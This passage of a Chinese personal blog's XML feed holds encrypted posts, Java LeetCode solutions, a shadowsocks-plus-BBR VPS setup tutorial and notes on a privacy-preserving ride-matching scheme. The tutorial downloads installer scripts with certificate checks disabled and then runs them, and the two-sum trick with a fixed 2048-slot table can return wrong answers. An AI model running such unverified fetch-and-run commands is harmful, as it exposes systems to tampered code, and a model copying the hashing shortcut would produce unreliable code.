0fac94f145effd18f047d5633a0a200576da2de4d8d0b9838bcba366cd8d4dabe7f3a8141717f0912aa6bfdf85c5027b4d935db35af9ba5c34f135a7aa3749040b98af1260a2e20ca6163dc33fa7e99f1af55c2363b86fcafd25cbe0313505d80efe6760e7d7d92413401ff906040a7924a93ee5f0cb1f35fc07cf6c6cab7fe4b84a0c3bbd1706e8c1063f5de039a07741c128805ca25763a6964dcbd3a901564d8eb9b4bf28c50a13eb87d0d82e9c734c26b27eeace7b376684840570d988d6dcac2f6f6e83f57cac2c398823e9385726b11925db177a5c77a681fe863e5d8a46c0e86b1b617d5c6996635bbae7a6a02518f783933247bf5cbef0c75dbeb2fab30e7fe1e1824029e88dce432cd2efbae6fb155984cb4b888ee331f1a5494a17c2ffb49173f8a230d54b1775e61ef0532fa338be3e5cca430da9829f7a53fda7dd0edb246cad5c292a3773d2d8c9b2350774651a12596582224314290beee6312152353ef6bf808a533a91fc67981ccb68aae62720daa7723d1e81a7ef0b986f0038fc526e6044e3f512a651c31fba7713e411ecd3ba7c220448ff647a16da2b588d32c559d7049da9dcce194a6e93a07bfbc35fc8056affbbb71a8b045f6188b4ca292763eae6e7fa5229a092432c57f5f076a837ee5ce30300d50f0cf74cebaa8feccbc915a4ed7c776ff31d95f63b5f8ab2493e0590e5d37ba2bb42eb07edd782f6523a95780553f8e754ccb90a14bed6413529206b36e064489f74af590467616b1cc4314d38df8321a7e9df3c5231beb05770abe72ec783d3e13de4cb632fc37d16e48628872b48ca7f5e8e93a82804eae19e731f3fb24920ad8a84c35189f482f72f7b914928febacb994ed7474dd65565ad922ecd3cccfc282e336771dfb1a489ace00beef454d863cc38becbda891515a18bf8b6d30fcc441d456956f305c67677f28a90c80de9430ee531ceed6a4739dad5e22f7c97ce99a9576992547c69ad4db53bcb8e61dd17788e9c61c9862139dc7918bb241f5ba467b972cd0b3017c90f8252daffa612a5977662f0ac5dec81026d1bbf1a4c32ec5b344953f100af44b7f9c71f0756232ef66267e0a5e57189cc69cf7e11490234e254e1037a65d5e82eb1a06923ea625835c13f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-2-4-pRide-current-search</title>
    <url>/2020/02/04/2020-02-04-pRide-current-search/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="5aba8afb0435e971fb99eec4d28f324193dd16815ab43634865e60f278896e14">05748cba185f8d68c3b09211d416710669ffda1bf0c0dd0ae1fc37e159e0596f8f073dfe568eeb855530224c0b9c86e54c408d9b54938ab41da1616627fb14ba8988f9d3d01554ec16692bd90050fc571c168f00dadb5efc64471027a634f15f6df4838e1b0a31595fd827053415df71f9a3d9ee08e9bd423a7b94f4870763d64e83db63b72a2d6f76a26ba69e3725f31a40eab7c6f3b6790e6ec089016984bc1099a8a6fadc6b80cc2b2ac4dadd377127493d97ce0725adf2c2f4f624196b11edbc5f874c28f542a3e99f53b01787dfaca12a4d908b5a33f093a7dcee93b575e471a7fe8619997d5a5f9fa9b16fcfd1b25c0eeeff938c2b7fb71db0722590eaf4577578524e63aee918e8df080d3d7623168cafc9f1e33ee539470956cae61e3415647760461ccedc0790a0c80a5f468e0089f87c1e9d8202bb4130a2876f4334a29715e774d14700ba1d2341b24423ef1a27344575845871b25c18f5d08c1c332561c6477ecf7a035572df04ca25017178e89cb358d4fc3809ec696d77a1172b8e19b9e937de3491131cdd9e5a6719e151b6fdc6c64817d3f99f289e7f6b1b8056f6068f18022216a34aa097d52c8e5609993838be5fd9d8cae3af98c32a0de714e3421ab80f05ee6cfa4cf00cb312dddec5464d9916c070d3bbfd32338e74687ae29cf789734577b9437f15013ac10da45bd462ef80f579a70fb52b49b94c2deb15a1d70c594794c232b25273fe14edf3362d369428ae1511c0e55d7a63b4868ff6b06a241941d428a65d8eab39ef189709627826f836019cb6af4ea665d1b1b7be42eb8f893ccd47805fdc0d80a8147d15c9f8b9567e66e1c0bbb9fb5d6d4c09be82ace8207dc7c79340a2e352a9ff0537a28c87dd27bde5076237bb4867029df6418e9d78dca179862d64e8a2d61d1c9d545d48bc4ca48ea606e62db498a10e2967cda95fa9e399f4b6a661e5ec447abbd3d87fe8a0827b0601f1c73125ca396a98d1708f148227b403e9a05b5bb5de2d6d25515d5e24b72166db0079483a3d2874864662e5a501ce2511d6e783f47561696fc7f2a3998759c6772b13120aba3d9419ff805dfbe65e0aaff9636f37527c7c9c4dc6109d806c9553f42ace4f4609e8579349bd2f4c2ab33ae5d3042842b3292b90d11652eb9960288f55e36e45e0edf2fa0f927d487c80112f0e3f80088f97b7366d5129ae75793766ebfdd1145cdad23043bf156c2af77c9eb91ff4626a3023034753c943e4ff4f1733b73b79fa6ae3ff57064b02cbcc5e130533c9662056bbb299730943f46498386ab86ce8eda8b18b64f7227a012a97930bbfd38de48ea6e4a9d55087bd3b726dcd839463177aafe8cbfa5484e12b45ca75fccf41952da12e3a5ee9fbb70759c1089472fcf730c902aff93b58798183161040fa089efc20306321c20cba2a8f3f50a5423a7cd3711c196789342f32d909b9d5c2ff90d3eefd6164b9c560a9d84eed6c0fb7ba06b5cdf6ef94117cb7d8ad0a1d1a32f1b9d34493e46d20f144149a5f38abea3ef4765e0a87f8ae4b9acafa4c313823402649b0d57a9ff0e351cf3444a251c308d7e0dedd29690db4908ea2f102b3f356aeb03db437622182dbb61d856b2a829089ea2a6f14f924fce6371311b2baf120472bb9a1de68d4e20274820efec1c4997aa3f806be47db515670c27c0d386c59635dd2a6e58d9d7912c1ceac99782db1473e9ca55adcaf710d504289bbb293542377729d18857583f825d3306d1f463bb033f5629482075175e0b3a55376c84c14e49d4448059a2cb2016b27dfe6065e2850dd6ef01dce997fd9cdfaeed3d344c345e468887060ee338a27c2fe59295dd19060f2f7bc6d134794ac94a4b4e5208990433a09137c00b595d3a77b96f404990bcafd43f96bb6c02967b0b0e6e87612cfcfd192d9fc9cdab9dda28c520df2b048ead972a924859a197410c0ca3d7a6dfa435964684eb8bb3360af86a49ad3de3198edb6b1b426d240ea4c299cd829a09ce50f3a0ca9123636d0a05619ad5ca117a546bf3bd694861a1f8ff8187317de94b3bbcab3c8da467461286ba4a25eef3bd16d762346813dfa1aa4573c071f28580daa7bda4dd9d088939d2953a254b0cdd595ad57e61a11d06cec90d57c4d107e85a4a3150bb4bad418f476f8be35158e6b2387b468391b140fda219641a63b505c132241ba8437f3b1f7de45872e5ef288e85c6a4ce27978593fa75ca0726f92d1ffb26b00a5337f7f6757db85346d2cf5e50a0a86395fd5d07e9f86208ab8445a1a2fdb8e34e3aeb02e7fbf889c03bac8665baa71b4c27afbfb692eca82871b3dd2d750ce018b685292e53b235c04607f95274c391bb8e005b722c1054216dbbbc9f45758639be89013748bdf88a5ace1f697c0b4f1f466a1ae70f68f487c6974b288e24878dc342ea75d004f887b4786c671c11ae78499426cc1dfc06dad83c60b1b6070c77d77caa53c4a5e5dc7f062945cb362a0fc672411a9b8fead2cd83e1b71ec4dc085e42c6ef06a53adc15c488104245a0d2eeb23a80c180d0f899660ecc29b70dffb061172fc115269482d90a9d79bbea8b8a0be9edef8d8781184c2d59fc199ffb0db180caf6761f51a607f02b67ab55facc50d28b876168960dc424d71c930276240b3bbb84e681a9937ef5515c776ebcd34227bbad0a8a15f57f857ca1f04ae8d54ac183ed6c3ad3567b42483dfe5da5e11bb6411cfaeb163bc4b76b5548809a2412de3fb7073a31205e962af102dfe7c269b18d184fb181c3e72f58abab07b6f3f8364223c2d0dc642f1dfcb3708d686bd9f57db7f6d8f45aa00194e9d643d60e493333e796853462896972683dd20bb6d77ceb1dc061ca1babe73e127394e7b954d1504a11d957ff554e6f8baa83b0a4d4d8e6d28287f6baad2c989c79eb336ad11929304a6650f2c1657df73e588248cb2eef05ea55e65b45702a6b0c20d5c67418193cc1c532f4d9c775a663b875ff23b8d02a9d66df7ab016a5b10555f0f25fa264e05760a93ca0d07a7760093c3a76e4c2b3f117bcbf4636331896412593277d277be0d732a9ae04e1fdc75de510b553690224449f0a9f09bca6677b58a0393d40034b5dc297ccaba5204f6334cc207dd06d604663ca1bc2041de2ad3de0ce6590ec8776746e52258c8933d28489da3a140850343fccf75bebc5113a6dea1193410874afccf40579e977a1f66da7133fa3ba823b93c4e0b4d463bbde55f0023043e9b3c522fd2cc39e65d4d9dae11d00e8da56cfccccddb2b16204a328a82928889613bc4c8c7db5a1ae49b6f5fa5d022d92619ee6ce159d57ebb619e879d12eedd2b72c4d982515c300af9878731c7020d76b9cd4c0c36960882285ca28708debbdc07c736d2dd4f076204d29405d4f908fcfffc6daa6e53f9f58057e4f1f9d526cecbde4973cab5cfee49d6bee3eeaa4d50036508a2c8dfe44b59cbaea80f56209ddc937b06f0ef06c6e6718b338c36141dfa2980f88a3887644e67e32aa4b9761df9e40f42ebd6605adb4eea4700ac2d4883dc2d326d4243ed1a6ae46391fcb20ef2ed744bd4dedf19b4f333b3a79c7a84b29537fd5434607c113df949d52b8a08fff3a20bcf8aacd73e716026d33f1ea43cb0d49183ac05f06cb3c4ec8941dbc1cc6790a88a646ceb031575bc7821034e7594065f6e77145b6a9402c08dbd61dd657d68d533c6f2a05a79a3a9f6c6ce1e03dd5b930a01aa0b34604ea694a5ae</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-04-tensorflow-gpu-CUDA</title>
    <url>/2020/02/04/2020-02-04-tensorflow-gpu-CUDA/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="e5f3c3bcd6febbd50136c951d8d25288be183d3ef5ba21ca0f66f3f8095f7a32">9bb11172a915b2481d7bfe343d72fa03</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>1-10 leetcode题解</title>
    <url>/2020/01/26/2020-01-26-leetcode/</url>
    <content><![CDATA[<p><img src="/2020/01/26/2020-01-26-leetcode/1-10.jpg" alt="1-10截图"></p>
<a id="more"></a>

<h1 id="1-两数之合"><a href="#1-两数之合" class="headerlink" title="1.两数之合"></a>1.两数之合</h1><ul>
<li><p>题目</p>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
</li>
<li><p>解题思路</p>
<p>主要的做题思路是遍历每个对象，如果target减去当前的值A得到的B在map中，那就找到了！</p>
<p>就把这两个位置(一个map中，一个当前位置)返回去。</p>
<p>如果没有找到，就把遍历到的（位置，值）放到map中</p>
<p>//以下为一个战胜100%的java代码，99%之类的用的是Map，看来以下这样写的效率应该高一点点</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">       <span class="keyword">int</span> maxValue = <span class="number">2048</span>;<span class="comment">//样例中nums数组的大小应该不比2048大</span></span><br><span class="line">       <span class="keyword">int</span>[] map = <span class="keyword">new</span> <span class="keyword">int</span>[maxValue];<span class="comment">//和Hashmap一样的作用，存入的值是（位置，值）</span></span><br><span class="line">       <span class="keyword">int</span> tool = maxValue - <span class="number">1</span>;<span class="comment">//2的11次方减1，大概是用于做hash的作用</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;<span class="comment">//遍历每个对象</span></span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">int</span> pos = map[(target - num) &amp; tool];</span><br><span class="line">            <span class="keyword">if</span> (pos != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//如果target减去当前的值A得到的B在map中，那就找到了</span></span><br><span class="line">                <span class="comment">//就把这两个位置(一个map中，一个当前位置)返回去                </span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;pos - <span class="number">1</span>, i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map[num &amp; tool] = i + <span class="number">1</span>;<span class="comment">//如果没有找到，就把遍历到的（位置，值）放到map中</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p>
<ul>
<li><p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">输入：(<span class="number">2</span> -&gt; <span class="number">4</span> -&gt; <span class="number">3</span>) + (<span class="number">5</span> -&gt; <span class="number">6</span> -&gt; <span class="number">4</span>)</span><br><span class="line">输出：<span class="number">7</span> -&gt; <span class="number">0</span> -&gt; <span class="number">8</span></span><br><span class="line">原因：<span class="number">342</span> + <span class="number">465</span> = <span class="number">807</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>题解很简单，就是遍历两个链表，设置一个carry作为进位</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;//这是定义了链表的节点</span></span><br><span class="line"><span class="comment"> *     int val;//节点有值</span></span><br><span class="line"><span class="comment"> *     ListNode next;//节点指向的下个节点</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;//节点的构造器，初始化val为传入x</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode result=<span class="keyword">new</span> ListNode(<span class="number">0</span>);<span class="comment">//做一个0值头指针</span></span><br><span class="line">        ListNode resultA=result;</span><br><span class="line">        <span class="keyword">int</span> carry=<span class="number">0</span>;<span class="comment">//进位值</span></span><br><span class="line">        <span class="keyword">int</span> i1,i2;<span class="comment">//遍历链表的值</span></span><br><span class="line">        <span class="keyword">int</span> sum;<span class="comment">//总数</span></span><br><span class="line">        <span class="comment">//carry!=0（carry=）是为了链表节点数一样，但是有进位的情况</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>|l2!=<span class="keyword">null</span>|carry!=<span class="number">0</span>)<span class="comment">//链表还有下一个节点、或者还有下个进位就继续</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//这里是为了判断链表数不一样的情况</span></span><br><span class="line">            i1=l1!=<span class="keyword">null</span>?l1.val:<span class="number">0</span>;</span><br><span class="line">            i2=l2!=<span class="keyword">null</span>?l2.val:<span class="number">0</span>;</span><br><span class="line">            System.out.print(i1);        </span><br><span class="line">            sum=i1+i2+carry;</span><br><span class="line">            carry=sum/<span class="number">10</span>;<span class="comment">//把sum的进位留到下一个节点</span></span><br><span class="line">            ListNode newNode=<span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);<span class="comment">//余数就放在当前新建节点       </span></span><br><span class="line">            result.next=newNode;</span><br><span class="line">            result=newNode;</span><br><span class="line">            l1=l1!=<span class="keyword">null</span>?l1.next:<span class="keyword">null</span>;<span class="comment">//遍历链表1</span></span><br><span class="line">            l2=l2!=<span class="keyword">null</span>?l2.next:<span class="keyword">null</span>;<span class="comment">//遍历链表2</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultA.next;<span class="comment">//返回0值头指针所指向的链表</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h1 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5. 最长回文子串"></a>5. 最长回文子串</h1><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p>
<ul>
<li><p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br></pre></td></tr></table></figure>
</li>
<li><p>主要的思路，就是遍历字符串的每个字符。</p>
<p>每个字符串从中间往外面寻找是否是回文，是的话继续寻找，直到两边字符不再相同，就停止。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length_s=s.length(),length_Palin=<span class="number">1</span>;</span><br><span class="line">        String result=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">int</span> first,second,first_next,second_next;</span><br><span class="line">        <span class="keyword">if</span>(length_s==<span class="number">1</span>) <span class="keyword">return</span> s;<span class="comment">//判断是否为一个字符，直接返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(length_s&gt;<span class="number">1</span>) result=s.substring(<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//把第一个字符放进来，使得最少为一个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用两个指针遍历</span></span><br><span class="line">        <span class="keyword">for</span>(first=<span class="number">0</span>,second=<span class="number">1</span>;second&lt;length_s;first++,second++)&#123;</span><br><span class="line">            <span class="comment">//这是两个指针判断的回文</span></span><br><span class="line">            <span class="keyword">if</span>(s.charAt(first)==s.charAt(second))&#123;</span><br><span class="line">                first_next=first;second_next=second;</span><br><span class="line">                    <span class="keyword">while</span>(first_next-<span class="number">1</span>&gt;=<span class="number">0</span> &amp;&amp; second_next+<span class="number">1</span>&lt;length_s &amp;&amp; s.charAt(first_next-<span class="number">1</span>)==s.charAt(second_next+<span class="number">1</span>))&#123;</span><br><span class="line">                    first_next--;</span><br><span class="line">                    second_next++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(result.length()&lt;second_next-first_next+<span class="number">1</span>)&#123;</span><br><span class="line">                    result=s.substring(first_next, second_next+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           	<span class="comment">//这是一个指针判断的两侧回文</span></span><br><span class="line">            <span class="keyword">if</span>(second&lt;=length_s-<span class="number">2</span>&amp;&amp;s.charAt(second-<span class="number">1</span>)==s.charAt(second+<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                first_next=second-<span class="number">1</span>;second_next=second+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(first_next-<span class="number">1</span>&gt;=<span class="number">0</span> &amp;&amp; second_next+<span class="number">1</span>&lt;length_s &amp;&amp; s.charAt(first_next-<span class="number">1</span>)==s.charAt(second_next+<span class="number">1</span>))&#123;</span><br><span class="line">                    first_next--;</span><br><span class="line">                    second_next++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(result.length()&lt;second_next-first_next+<span class="number">1</span>)&#123;</span><br><span class="line">                    result=s.substring(first_next, second_next+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h1 id="9-回文数"><a href="#9-回文数" class="headerlink" title="9.回文数"></a>9.回文数</h1><p><a href="https://leetcode-cn.com/problems/palindrome-number/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-number/</a></p>
<ul>
<li><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
</li>
<li><p>主要是借鉴了评论区高赞老哥的思路，因为x是int型,若逆序后(即12345-&gt;54321)溢出则不是回文序列。</p>
<p>分三种情况</p>
<p>1)x为负数,false<br>2)x逆序后,与原来x不同,溢出或非回文,false<br>3)x逆序后与原来x相同,回文,true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> x_origin=x;</span><br><span class="line">        <span class="keyword">long</span> reserve=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            reserve=reserve*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">int</span>)reserve!=x_origin) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建机场简易教程shadowsocks centos7 vutlr bbr</title>
    <url>/2020/01/26/2020-01-26-shadowsocks-centos7-vutlr-bbr/</url>
    <content><![CDATA[<h2 id="1-获得vutlr服务器后-包含ip、用户名和密码-使用Xshell连接（其他连接器请自行百度）"><a href="#1-获得vutlr服务器后-包含ip、用户名和密码-使用Xshell连接（其他连接器请自行百度）" class="headerlink" title="1.获得vutlr服务器后(包含ip、用户名和密码)使用Xshell连接（其他连接器请自行百度）"></a>1.获得vutlr服务器后(包含ip、用户名和密码)使用Xshell连接（其他连接器请自行百度）</h2><h2 id="2-依次输入以下代码安装shadowsocks"><a href="#2-依次输入以下代码安装shadowsocks" class="headerlink" title="2.依次输入以下代码安装shadowsocks"></a>2.依次输入以下代码安装shadowsocks</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install wget</span><br></pre></td></tr></table></figure>

<h4 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget –no-check-certificate -O shadowsocks.sh https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teddysun&#x2F;shadowsocks_install&#x2F;master&#x2F;shadowsocks.sh</span><br></pre></td></tr></table></figure>

<h4 id="获取shadowsocks-sh读取权限"><a href="#获取shadowsocks-sh读取权限" class="headerlink" title="获取shadowsocks.sh读取权限"></a>获取shadowsocks.sh读取权限</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x shadowsocks.sh</span><br></pre></td></tr></table></figure>

<h4 id="设置个人shadowsocks密码和端口号"><a href="#设置个人shadowsocks密码和端口号" class="headerlink" title="设置个人shadowsocks密码和端口号"></a>设置个人shadowsocks密码和端口号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>

<p>然后依次输入你的密码password、端口号(就是ss服务的端口号，后面连接使用)、加密模式(很多人推荐7 aes-256-cfb)</p>
<p>按任意键开始配置press any key to start，如果是第一次配置需要几分钟</p>
<h4 id="配置完之后可以看到用四行红字"><a href="#配置完之后可以看到用四行红字" class="headerlink" title="配置完之后可以看到用四行红字"></a>配置完之后可以看到用四行红字</h4><p>这个就是我们shadowsocks的连接信息了,其中除了ip是服务器自带的，端口、密码、加密模式都是我们自选的</p>
<h2 id="3-安装拥塞控制BBR加速上网"><a href="#3-安装拥塞控制BBR加速上网" class="headerlink" title="3.安装拥塞控制BBR加速上网"></a>3.安装拥塞控制BBR加速上网</h2><h4 id="安装BBR"><a href="#安装BBR" class="headerlink" title="安装BBR"></a>安装BBR</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https:&#x2F;&#x2F;github.com&#x2F;teddysun&#x2F;across&#x2F;raw&#x2F;master&#x2F;bbr.sh</span><br></pre></td></tr></table></figure>

<h4 id="获得读取权限"><a href="#获得读取权限" class="headerlink" title="获得读取权限"></a>获得读取权限</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x bbr.sh</span><br></pre></td></tr></table></figure>

<h4 id="启动BBR安装"><a href="#启动BBR安装" class="headerlink" title="启动BBR安装"></a>启动BBR安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bbr.sh</span><br></pre></td></tr></table></figure>

<p>这步安装也蛮久的</p>
<p>按任意键安装，完成之后提示是否重启，输入y确定重启</p>
<p>重启之后</p>
<p>输入以下的指令查看BBR是否启动，若提示tcp_bbr则成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure>



<h2 id="4-在客户端重启ss，享受你的丝滑ss吧"><a href="#4-在客户端重启ss，享受你的丝滑ss吧" class="headerlink" title="4.在客户端重启ss，享受你的丝滑ss吧"></a>4.在客户端重启ss，享受你的丝滑ss吧</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service shadowsocks restart</span><br></pre></td></tr></table></figure>





<hr>
<p>参考链接</p>
<p>1.使用vultr(vps)搭建ss并开启BBR快速上网教程 超简单10分钟搞定</p>
<p><a href="https://wistbean.github.io/vultr-vps-bbr-ss.html" target="_blank" rel="noopener">https://wistbean.github.io/vultr-vps-bbr-ss.html</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>vpn</tag>
        <tag>centos</tag>
        <tag>vutlr</tag>
      </tags>
  </entry>
  <entry>
    <title>pRide具体方案</title>
    <url>/2020/01/23/2020-01-23-pRide-optimized-construction/</url>
    <content><![CDATA[<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162426100.png" alt="图1"></p>
<center>这是一篇pRide具体方案的翻译简化版</center>
<a id="more"></a>

<h2 id="优化方案"><a href="#优化方案" class="headerlink" title="优化方案"></a>优化方案</h2><p>初始方案暂且不谈，先说优化方案。</p>
<p>一：地图分块，减少计算量</p>
<p>二：把路网嵌入向量打包起来，使得加密等操作可以一步完成</p>
<h3 id="步骤：Setup、Location-update、Ride-request、Ride-matching"><a href="#步骤：Setup、Location-update、Ride-request、Ride-matching" class="headerlink" title="步骤：Setup、Location-update、Ride-request、Ride-matching"></a>步骤：Setup、Location-update、Ride-request、Ride-matching</h3><p>为了保证分块后的精度，我们首先寻找与乘客所处区域α的最近司机，再以乘客到该司机的距离为半径来判断区域α周围的区域是否划入范围（就是看以该距离为半径的圆是否“触”到了周围区域）</p>
<h3 id="使用技术："><a href="#使用技术：" class="headerlink" title="使用技术："></a>使用技术：</h3><p>路网嵌入（ROAD NETWORK ENBEDDING），用于提高最短距离计算效率</p>
<p>同态加密 （Homomorphic），用于提供密文状态下的加法（及乘法）同步到明文中</p>
<p>混淆电路（Garbled Circuit），用于提供CP（    Crypto Provider）和ORH服务器的安全两方计算、有点像零知识证明</p>
